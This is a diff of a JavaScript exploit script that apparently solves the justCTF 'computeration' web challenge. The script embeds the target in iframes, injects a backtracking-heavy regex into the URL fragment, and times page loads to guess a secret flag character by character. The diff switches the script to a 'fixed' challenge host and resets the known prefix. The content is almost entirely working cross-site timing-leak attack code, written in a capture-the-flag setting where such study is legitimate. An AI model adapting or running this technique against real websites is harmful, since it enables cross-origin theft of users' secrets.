@@ -8,12 +8,12 @@ var delay_iframe = document.createElement('iframe');
 document.body.appendChild(delay_iframe); 
 var date_time0;
 var date_time1;
-var flag = "justCTF{cross";
+var flag = "justCTF{";
 var candidate = "abcdefghijklmnopqrstuvwxyz_}";
 
 async function ini(c){
     date_time0 = Date.now();
-    delay_iframe.src="https://computeration.web.jctf.pro/";
+    delay_iframe.src="https://computeration-fixed.web.jctf.pro/";
     return new Promise(resolve => { 
         delay_iframe.onload = async () => {
             await test(c);
@@ -23,7 +23,7 @@ async function ini(c){
 }
 
 async function test(c){
-    delay_iframe.src=`https://computeration.web.jctf.pro/#^(?=${flag+c}).*.*.*.*.*.*.*.*.*!$`;
+    delay_iframe.src=`https://computeration-fixed.web.jctf.pro/#^(?=${flag+c}).*.*.*.*.*.*.*.*.*!$`;
     let iframee2 = document.createElement('iframe');
     iframee2.src="https://computeration.web.jctf.pro";
     document.body.appendChild(iframee2);
